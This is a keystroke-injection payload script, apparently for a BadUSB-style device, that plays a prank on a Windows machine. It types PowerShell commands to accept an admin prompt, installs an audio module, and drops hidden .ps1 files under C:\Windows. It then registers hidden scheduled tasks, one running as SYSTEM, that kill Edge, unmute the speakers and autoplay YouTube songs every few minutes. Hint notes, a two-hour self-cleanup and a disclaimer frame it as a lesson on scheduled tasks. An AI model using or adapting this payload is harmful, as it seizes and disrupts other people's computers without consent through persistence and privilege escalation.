//Launchs Youtube Videos "Where Is The Love", "Why Can't We Be Friends",and "Thank You For Being A Friend"
//Every 4 minutes 
//When you close Microsoft Edge it Launches "Ain't No Sunshine"
//Also launches notepad to explain how to remove the scheduled tasks with hints
layout('us')
//Gets Admin Privileges
press('GUI r')
delay(2000)
type("powershell.exe")
press("ENTER")
delay(3000)
type("Start-Process PowerShell -Verb RunAs; exit")
press("ENTER")
delay(5000)
press("TAB")
delay(500)
press("TAB")
delay(500)
press("ENTER")
delay(5000)
//This downloads and imports the module needed to unmute and turn the volume up
type('Install-PackageProvider -Name NuGet -Force; Import-PackageProvider -Name NuGet -Force; Install-Module -Name AudioDeviceCmdlets -Scope CurrentUser -Force; Import-Module AudioDeviceCmdlets\n')
delay(20000)
//These make the folders to store the .ps1 files in
type("New-Item -Path 'C:\\Windows\\QueryLanguage' -ItemType Directory -Force\n")
delay(500)
type("New-Item -Path 'C:\\Windows\\SpeechToText' -ItemType Directory -Force\n")
//These make the .ps1 files
type('$whereisthelove = @\"\nSet-AudioDevice -PlaybackMute $False\nSet-AudioDevice -PlaybackVolume 60\nGet-Process msedge,msedgewebview2 -ErrorAction SilentlyContinue | Stop-Process -Force\nSet-AudioDevice -PlaybackMute $False\nSet-AudioDevice -PlaybackVolume 60\nStart-Process msedge.exe "--new-window --autoplay-policy=no-user-gesture-required https://www.youtube.com/watch?v=twq9RDsmea8&list=RDtwq9RDsmea8&autoplay=1"\nStart-Sleep -Seconds 4\nschtasks /Run /TN "WindowMonitor"\n"@\n')
delay(500)
type('$whereisthelove | Set-Content -Path "C:\\Windows\\QueryLanguage\\WhereIsTheLove.ps1" -Encoding UTF8\n')
delay(500)
type('$whycantwebefriends = @\"\nSet-AudioDevice -PlaybackMute $False\nSet-AudioDevice -PlaybackVolume 60\nGet-Process msedge,msedgewebview2 -ErrorAction SilentlyContinue | Stop-Process -Force\nSet-AudioDevice -PlaybackMute $False\nSet-AudioDevice -PlaybackVolume 60\nStart-Process msedge.exe "--new-window --autoplay-policy=no-user-gesture-required https://www.youtube.com/watch?v=Fwe-7IlAtqc&list=RDFwe-7IlAtqc&autoplay=1"\nStart-Sleep -Seconds 4\nschtasks /Run /TN "WindowMonitor"\n"@\n')
delay(500)
type('$whycantwebefriends | Set-Content -Path "C:\\Windows\\QueryLanguage\\WhyCantWeBeFriends.ps1" -Encoding UTF8\n')
delay(500)
type('$thankyouforbeingafriend = @\"\nSet-AudioDevice -PlaybackMute $False\nSet-AudioDevice -PlaybackVolume 60\nGet-Process msedge,msedgewebview2 -ErrorAction SilentlyContinue | Stop-Process -Force\nSet-AudioDevice -PlaybackMute $False\nSet-AudioDevice -PlaybackVolume 60\nStart-Process msedge.exe "--new-window --autoplay-policy=no-user-gesture-required https://www.youtube.com/watch?v=b90lDlCVtx0&list=RDb90lDlCVtx0&autoplay=1"\nStart-Sleep -Seconds 4\nschtasks /Run /TN "WindowMonitor"\n"@\n')
delay(500)
type('$thankyouforbeingafriend | Set-Content -Path "C:\\Windows\\QueryLanguage\\ThankYouForBeingAFriend.ps1" -Encoding UTF8\n')
delay(500)
type('$notepadlaunch = @\'\n$message = @"\nThis will be used to teach Scheduled-Tasks. Hints will be launched each progressively more helpful to silence the music.\n\nDo not worry everything is going to be okay especially if you really like the music or you do not want to learn. Everything put on the system is set to self terminate in 2 hours.\n\n\nMy first Hint to disable this is I used PowerShell.\n\nThis is free and open source learning software available at my repository.\nOnly use this legally morally and ethically on a system you have permission to use for this task.\nIf you do not have legal permission I do not condone illegal behaviour.\n\nCheck out my GitHub Repository: "https://github.com/Son-of-David"\n\nSincerely,\n\nSon-of-David\n"@\n$temp = Join-Path $env:TEMP "Hint1.txt"\n$message | Out-File -FilePath $temp -Encoding UTF8\nStart-Process notepad $temp\n\'@\n')
delay(500)
type('$notepadlaunch | Set-Content -Path "C:\\Windows\\SpeechToText\\Hint1.ps1" -Encoding UTF8\n')
delay(500)
type('$notepadlaunch1 = @\'\n$message = @"\nBelow is the text that you may need to remove these tunes. I will even give you the password for the encryption which is "From12to144" remove the quotes.\n\n\nMmNkMDUxMmQ2YjYzYmVlZGUyMTFjMGQyZmM3OGZhMWZhY2I0YmQ0NmI1NWUzOWViMTM3NmU5YjM4YTYzMWJlMw0KZWNiYjlkNDkxZWIwY2VhYWI1Y2M2MjY1NzBiNzQxYzc4NWI3OWM2MjU4YmZlNGEzY2I5NjRkMDZlZWEwZWMzMw0KMmI0MzVmNGZjM2M0Yjg3YzA1ZDQ2YTYyYjY1MDBiMGU4ZDM0ZGZhYWNlYmMxZWU4ODQ3Y2E3YjM1MmMxYmE3MA0KM2QyOWQ0MDI5OWQwMWE5YjEyOWRlYzE2NzI0NGFiNTk5MTMzYmNjNjcwOTljNzNiYmVhMjA5ZWJiNmNkYTRjOA0KYjVjYzYyNjU3MGI3NDFjNzg1Yjc5YzYyNThiZmU0YTNhYmZhMjdlODM2YzA2YTIyMTExMjQ3NGU2NzMxOTM3Zg0KYzUwYjMyNTBiNDRjMGVmNjcyYWQzZTRkOWQ4NmIxMzFkM2Q2ZjhiZWExNmFhZTc3MjJjZGQ0ZWI1ZjM0ZGQ4YQ0KMzVkOGE1NTU3MjYxYjhkYzBkZDY1NzVhMmViM2IyZGJlNTY2NTQ2YmQ0OWMzYTJjZTQ0M2FjZTQxNjQ1ZmJjYQ0KZTM3NDlhMWFjMjRiNDY4MDhlZTIyZmY1YmU0YjMwYWNhMGE4YTY5NmUzNGQyZGNhOGQzNGRmYWFjZWJjMWVlOA0KODQ3Y2E3YjM1MmMxYmE3MDNkMjlkNDAyOTlkMDFhOWI2MmIyZTlmMDljZGQ0ZTFmZDNkNmY4YmVhMTZhYWU3Nw0KMjJjZGQ0ZWI1ZjM0ZGQ4YTM1ZDhhNTU1NzI2MWI4ZGNiMzlkYTNkMTcyMGJiOGJmZDg3NTYwY2RmNWFjNjFiYw0KYTUwYTdkYjczZDRlODVlZmVmYjc4MGNjYWUwMDQ0MjcxYWY4ZGEwM2JlZjBjODYzNDY5ZWY3ZjFhZTk3MTE4Nw0KZjBjYTgxM2U1MmY4ZGE3MmQzODIxNDVlOWVlN2U0YTQ0NDMzZjk2MzlhZmRlMjExOWVjOTM3MGJiMWRlOTQzMw0KODllYTQ3ZDcwMzUzNmYxZGMxZmFjMTU4YzU3ZjdjZmM5ZDcxZmViZmUxM2IwNGUzZWE3Y2M4M2MyYWYwMzMzNQ0KMmNkMDUxMmQ2YjYzYmVlZGUyMTFjMGQyZmM3OGZhMWYxMWZhMzEwZDc1ZGRiZTczMjQ0ODBkNjczYzc3MTY0NA0KMTE2NzgyOTJjMTAwYzNkNGJkYWQ4MzdhMGU5Yjc0ZTE3MzI4YjEwZTkxMjVhNWY3MjJlYWYyMTNmYmYyM2ZmZQ0KMDk2MjFjODMxMTY2MTRjZDFmOTkwMDc2MzhjMmRhMmUwMTc0MWYzZTNlMTMxNjYzZTIwNWU0ZmZiY2EyYmEyMg0KYTYwYTk0YmU3NGVjN2I5MmE3ODIyZWJhMDgxOWI1OWQzNmYyNWYxNDUxNDc3MTQzNDM1NzE1MDA1YjdkMzMzNw0KOTdhZmQ4ZjQ4NDcyMzAxMThmYzI5OTE2NjQ2NzY4ODU3MmI5NWJmN2M3ZTA1NzUzODcyY2RiOWYzMTNlYmE3NQ0KMDUzMjNkN2ZjZTMwMzEzMzc3YzExNzdkZjk4NzZlMzZlODFjZjg5MDY3Yjk4ZDUxNDJmYjU3MDM5NjBmNGFhNw0KOTkyMWQ4NmUzOTdhNDYyYzJmMjBkYzU3ZGYwYWRlNDRjNWJjOWI1YTEwY2I5OTI2Yjg5NGZiY2FhMzJmZmNjMA0KMWE2NjQwNTQyYTczZWRhYjc3YTU5ZmUzYjY5YWUyNjllODFjZjg5MDY3Yjk4ZDUxZjk2NWVjY2ZhYmE3YjI2Nw0KNmI4MjFiYmQzMjQ2YjZmMTY5YjMzNWVkOTkyYWZjZGYyYjYxN2UyZTI1ODAzY2JiN2FjY2RiODE3ZWQ1MTZkYg0KYzkxNTVkNGJiYmQwMWNmNA==\n\n\n\Trust me it gets a lot easier!\n\nSon-of-David\n"@\n$temp = Join-Path $env:TEMP "Hint2.txt"\n$message | Out-File -FilePath $temp -Encoding UTF8\nStart-Process notepad $temp\n\'@\n')
delay(500)
type('$notepadlaunch1 | Set-Content -Path "C:\\Windows\\SpeechToText\\Hint2.ps1" -Encoding UTF8\n')
delay(500)
type('$notepadlaunch2 = @\'\n$message = @"\nIf you did not notice that quick black box that comes across the screen before things happen that is PowerShell. It is what launches the script that turns off mute, turns the volume to 60%, and kills the previous Microsoft Edge Window, then launches a new Microsoft Edge window with YouTube on auto play every 4 minutes. With that being said Microsoft Edge may not be the best place for questions for various reasons including the 4 minute interval kill task.\nTry Copilot!.\nIf you what to brute force the hints all the Hints tasks are Hint with a number at the end. The PowerShell command would be shctasks /Run /TN "Hint" /F\n\nSon-of-David\n"@\n$temp = Join-Path $env:TEMP "Hint3.txt"\n$message | Out-File -FilePath $temp -Encoding UTF8\nStart-Process notepad $temp\n\'@\n')
delay(500)
type('$notepadlaunch2 | Set-Content -Path "C:\\Windows\\SpeechToText\\Hint3.ps1" -Encoding UTF8\n')
delay(500)
type('$notepadlaunch3 = @\'\n$message = @"\nOkay time to stop messing around and actually help you with some very useful commands in PowerShell. Scheduled Tasks will a lot of times use .ps1 and .bat files so asks Copilot how to find then and analyze them. Secondly in PowerShell you can type in Get-ScheduledTask to see them all ask Copilot for commands involving ScheduledTask. There is a very long TaskName in the ScheduledTasks if you run Get-ScheduledTask that is the one you want to launch to clean up everything the file its PowerShell command is stored in is called YoureLuckyImNice.\n\nSon-of-David\n"@\n$temp = Join-Path $env:TEMP "Hint4.txt"\n$message | Out-File -FilePath $temp -Encoding UTF8\nStart-Process notepad $temp\n\'@\n')
delay(500)
type('$notepadlaunch3 | Set-Content -Path "C:\\Windows\\SpeechToText\\Hint4.ps1" -Encoding UTF8\n')
delay(500)
type('$notepadlaunch4 = @\'\n$message = @"\nA lot of malicious actors will not store clean up files on a computer at least not in plain text and give you hints to them but you can still find them and decrypt them. The most common way to find malicious software is irregular things happening at regular intervals. You can also look for strange looking names in folders that may make sense on the outside but not on the inside. I made a slight attempt to hide the folders that the .ps1 files are in but not the .ps1 names. I also saved all the Tasks at root.\n\nSon-of-David\n"@\n$temp = Join-Path $env:TEMP "Hint5.txt"\n$message | Out-File -FilePath $temp -Encoding UTF8\nStart-Process notepad $temp\n\'@\n')
delay(500)
type('$notepadlaunch4 | Set-Content -Path "C:\\Windows\\SpeechToText\\Hint5.ps1" -Encoding UTF8\n')
delay(500)
type('$notepadlaunch5 = @\'\n$message = @"\n5 minute warning! All vidoes will stop launching, malicious tasks will be unregistered, .ps1 files will be deleted and new folders with disappear. You either got here one of two ways you were patient or you found out how to get here early. If you have not launched this task early 2 hours is almost up. The way to break the encryption from Hint2 is to use a website called cyber chef it is safe but should not be used for sensitive material. Google it! I mean if you use Microsoft Edge literally use google, Bing led me to a phishing fake version of the site. Use edge to get to google.com then go to Cyber Chef. On their page in the operations column select favourites drag from Base64 to recipe then find Encryption/Encoding select GOST decrypt and place it below base 64. Type your password into the box for the Key on GOST nothing else needs to be changed. Copy and Paste the encrypted message and place it in input and click bake but it should auto bake.\nRight click on PowerShell run as Administrator copy and paste in the string and hit enter.\nHope you had fun!\n\nSon-of-David\n"@\n$temp = Join-Path $env:TEMP "Hint6.txt"\n$message | Out-File -FilePath $temp -Encoding UTF8\nStart-Process notepad $temp\n\'@\n')
delay(500)
type('$notepadlaunch5 | Set-Content -Path "C:\\Windows\\SpeechToText\\Hint6.ps1" -Encoding UTF8\n')
delay(500)
//Very Special .ps1 file essentially it figures out when a msedge window closes which is difficult
//since msedge always runs on windows this determines if the msedge process was or is  actually open
//Once it detects closure of a window it launches another msedge window with a youtube url
type("$CCCrazyUS = @'\n")
type("Add-Type @\"\n")
type('using System;\n')
type('using System.Runtime.InteropServices;\n')
type('public class WinAPI {\n')
type('    [DllImport("user32.dll")]\n')
type('    public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);\n')
type('    [DllImport("user32.dll")]\n')
type('    public static extern bool IsWindowVisible(IntPtr hWnd);\n')
type('}\n')
type('"@\n')
type("\n")
type("function Get-EdgeWindowCount {\n")
type("    $count = 0\n")
type("    $edgeProcs = Get-Process -Name msedge -ErrorAction SilentlyContinue\n")
type("    if ($edgeProcs) {\n")
type("        foreach ($proc in $edgeProcs) {\n")
type("            try {\n")
type("               $handle = $proc.MainWindowHandle\n")
type("               if ($handle -ne 0 -and [WinAPI]::IsWindowVisible($handle)) {\n")
type("                    $title = New-Object System.Text.StringBuilder 256\n")
type("                    [WinAPI]::GetWindowText($handle, $title, $title.Capacity) | Out-Null\n")
type("                    if ($title.Length -gt 0) {\n")
type("                        $count++\n")
type("                    }\n")
type("                }\n")
type("            } catch {}\n")
type("        }\n")
type("    }\n")
type("    return $count\n")
type("}\n")
type("\n")
type('$playlist = "https://www.youtube.com/watch?v=9sDvpDqc5co&list=RD9sDvpDqc5co&autoplay=1"\n')
type('$timeoutSeconds = 210\n')
type('$masterStartTime = Get-Date')
type('\n')
type('while ($true) {\n')
type('    if ((Get-Date) - $masterStartTime -gt (New-TimeSpan -Seconds $timeoutSeconds)) {\n')
type('        exit\n')
type('    }\n')
type('    $startTime = Get-Date\n')
type('    while ((Get-EdgeWindowCount) -gt 0) {\n')
type('        if ((Get-Date) - $masterStartTime -gt (New-TimeSpan -Seconds $timeoutSeconds)) {\n')
type('            exit\n')
type('        }\n')
type('        if ((Get-Date) - $startTime -gt (New-TimeSpan -Seconds $timeoutSeconds)) {\n')
type('            break\n')
type('        }\n')
type('        Start-Sleep -Seconds 2\n')
type('    }\n')
type('    if ((Get-Date) - $masterStartTime -gt (New-TimeSpan -Seconds $timeoutSeconds)) {\n')
type('        exit\n')
type('    }\n')
type('    Set-AudioDevice -PlaybackMute $False\n')
type('    Set-AudioDevice -PlaybackVolume 70\n')
type('    Start-Process msedge.exe -ArgumentList "--new-window --autoplay-policy=no-user-gesture-required $playlist"\n')
type('\n')
type('    while ((Get-EdgeWindowCount) -eq 0) {\n')
type('        if ((Get-Date) - $masterStartTime -gt (New-TimeSpan -Seconds $timeoutSeconds)) {\n')
type('            exit\n')
type('        }\n')
type('        Start-Sleep -Seconds 1\n')
type('    }\n')
type("}\n")
type("'@\n")
type('$CCCrazyUS | Set-Content -Path "C:\\Windows\\QueryLanguage\\AintNoSunshine.ps1" -Encoding UTF8\n')
//This is important this .ps1 file destroys everything that was put on when launched 
type('$youreluckyimnice = @"\nschtasks /Delete /TN "WindowMonitor" /F\nschtasks /Delete /TN "WhereIsTheLove" /F\nschtasks /Delete /TN "WhyCantWeBeFriends" /F\nschtasks /Delete /TN "ThankYouForBeingAFriend" /F\nschtasks /Delete /TN "SomeDaysImCainSomeDaysImAbelButTodayIAmAble" /F\nschtasks /Delete /TN "Hint1" /F\nschtasks /Delete /TN "Hint2" /F\nschtasks /Delete /TN "Hint3" /F\nschtasks /Delete /TN "Hint4" /F\nschtasks /Delete /TN "Hint5" /F\nschtasks /Delete /TN "Hint6" /F\nGet-Process msedge,msedgewebview2,notepad -ErrorAction SilentlyContinue | Stop-Process -Force\nRemove-Item -Path "C:\\Windows\\SpeechToText" -Recurse -Force\nRemove-Item -Path "C:\\Windows\\QueryLanguage" -Recurse -Force\nUninstall-Module -Name AudioDeviceCmdlets\nRemove-Item -Path "C:\\Program Files\\PackageManagement\\ProviderAssemblies\\nuget" -Recurse -Force\nexit\n"@\n')
delay(500)
type('$youreluckyimnice | Set-Content -Path "C:\\Windows\\QueryLanguage\\YoureLuckyImNice.ps1" -Encoding UTF8\n')
delay(500)
//These register the tasks
//The first tasks launch once minutes after they are scheduled
type('$t = (Get-Date).AddMinutes(2); $sd = $t.ToString(\'MM/dd/yyyy\'); $st = $t.ToString(\'HH:mm\'); schtasks /Create /TN "Hint1" /SC ONCE /TR "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""C:\\Windows\\SpeechToText\\Hint1.ps1""" /SD $sd /ST $st\n')
delay(500)
type('$t = (Get-Date).AddMinutes(5); $sd = $t.ToString(\'MM/dd/yyyy\'); $st = $t.ToString(\'HH:mm\'); schtasks /Create /TN "Hint2" /SC ONCE /TR "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""C:\\Windows\\SpeechToText\\Hint2.ps1""" /SD $sd /ST $st\n')
delay(500)
type('$t = (Get-Date).AddMinutes(10); $sd = $t.ToString(\'MM/dd/yyyy\'); $st = $t.ToString(\'HH:mm\'); schtasks /Create /TN "Hint3" /SC ONCE /TR "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""C:\\Windows\\SpeechToText\\Hint3.ps1""" /SD $sd /ST $st\n')
delay(500)
type('$t = (Get-Date).AddMinutes(75); $sd = $t.ToString(\'MM/dd/yyyy\'); $st = $t.ToString(\'HH:mm\'); schtasks /Create /TN "Hint4" /SC ONCE /TR "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""C:\\Windows\\SpeechToText\\Hint4.ps1""" /SD $sd /ST $st\n')
delay(500)
type('$t = (Get-Date).AddMinutes(100); $sd = $t.ToString(\'MM/dd/yyyy\'); $st = $t.ToString(\'HH:mm\'); schtasks /Create /TN "Hint5" /SC ONCE /TR "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""C:\\Windows\\SpeechToText\\Hint5.ps1""" /SD $sd /ST $st\n')
delay(500)
type('$t = (Get-Date).AddMinutes(115); $sd = $t.ToString(\'MM/dd/yyyy\'); $st = $t.ToString(\'HH:mm\'); schtasks /Create /TN "Hint6" /SC ONCE /TR "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""C:\\Windows\\SpeechToText\\Hint6.ps1""" /SD $sd /ST $st\n')
delay(500)
//This task launches once only when its called upon
type('schtasks /Create /TN "WindowMonitor" /TR "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""C:\\Windows\\QueryLanguage\\AintNoSunshine.ps1""" /SC ONCE /SD 11/11/2024 /ST 00:00 /F\n')
delay(500)
//These Tasks Launch indefinately every 12 minutes but all start 4 minutes apart at 00:00,00:04,&00:08 
type('schtasks /Create /TN "WhereIsTheLove" /TR "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""C:\\Windows\\QueryLanguage\\WhereIsTheLove.ps1""" /SC Daily /ST 00:00 /RI 12 /DU 24:00 /F\n')
delay(500)
type('schtasks /Create /TN "WhyCantWeBeFriends" /TR "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""C:\\Windows\\QueryLanguage\\WhyCantWeBeFriends.ps1""" /SC Daily /ST 00:04 /RI 12 /DU 24:00 /F\n')
delay(500)
type('schtasks /Create /TN "ThankYouForBeingAFriend" /TR "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""C:\\Windows\\QueryLanguage\\ThankYouForBeingAFriend.ps1\"""/SC Daily /ST 00:08 /RI 12 /DU 24:00 /F\n')
delay(500)
//This task launches 120 minutes after creation every minute for 24 hours this is the deletion task.
type('$t = (Get-Date).AddMinutes(120); $st = $t.ToString(\'HH:mm\'); $sd = $t.ToString(\'MM/dd/yyyy\'); schtasks /Create /TN "SomeDaysImCainSomeDaysImAbelButTodayIAmAble" /SC Minute /MO 1 /TR "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""C:\\Windows\\QueryLanguage\\YoureLuckyImNice.ps1""" /SD $sd /ST $st /DU 24:00 /RU "SYSTEM" /RL HIGHEST\n')
delay(500)
//This is so that all the scheduled tasks still function on battery power
type('$tasks = @("Hint1", "Hint2", "Hint3", "Hint4", "Hint5", "Hint6", "WindowMonitor", "WhereIsTheLove", "WhyCantWeBeFriends", "ThankYouForBeingAFriend",  "SomeDaysImCainSomeDaysImAbelButTodayIAmAble"); foreach ($name in $tasks) { $task = Get-ScheduledTask -TaskName $name; $settings = $task.Settings; $settings.DisallowStartIfOnBatteries = $false; $settings.StopIfGoingOnBatteries = $false; Set-ScheduledTask -TaskName $name -Settings $settings };\n')
delay(500)
